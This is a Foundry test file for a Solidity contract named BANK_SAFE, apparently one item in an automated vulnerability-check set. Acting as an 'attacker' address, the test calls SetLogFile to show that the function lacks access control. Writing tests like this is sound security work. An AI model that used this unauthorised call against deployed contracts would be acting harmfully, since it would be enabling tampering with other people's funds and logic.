// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/0x561eac93c92360949ab1f1403323e6db345cbf31.sol";

contract BANK_SAFE_Test is Test {
    BANK_SAFE bankSafe;
    address constant attacker = address(0x123456);
    
    function setUp() public {
        bankSafe = new BANK_SAFE();
    }

    function test_MissingAccessControl_SetLogFile() public {
        console.log("--- Trigger SetLogFile ---");
        
        vm.prank(attacker);
        (bool success, ) = address(bankSafe).call(
            abi.encodeWithSignature("SetLogFile(address)", attacker)
        );

        // Final vulnerability verdict based on call success
        if (success) {
            console.log("Vulnerability Exists: Unauthorized call to SetLogFile succeeded without reverting");
        } else {
            console.log("Vulnerability not Exist: Unauthorized call to SetLogFile reverted");
            fail("Expected unauthorized call to succeed (vulnerability exists)");
        }
    }
}